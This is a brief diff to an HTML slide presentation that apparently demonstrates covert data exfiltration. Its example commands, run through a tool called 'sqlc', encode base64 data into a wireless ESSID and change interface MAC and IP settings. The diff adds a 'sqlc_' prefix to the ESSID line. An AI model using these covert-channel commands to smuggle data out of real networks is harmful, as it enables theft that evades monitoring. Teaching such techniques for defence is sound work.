@@ -393,7 +393,7 @@ sqlc -E 'ifconfig eth0 hw ether CE:CA:60:6A:CE:CA; ifconfig eth0 192.168.1.1' ..
 					<ul>
 
 <pre><code data-trim contenteditable>	
-sqlc -e 'iwconfig eth0 essid {B64DATA}; sleep 15' ...
+sqlc -e 'iwconfig eth0 essid sqlc_{B64DATA}; sleep 15' ...
 </code></pre>
 
 <img src="images/wireless.jpg">
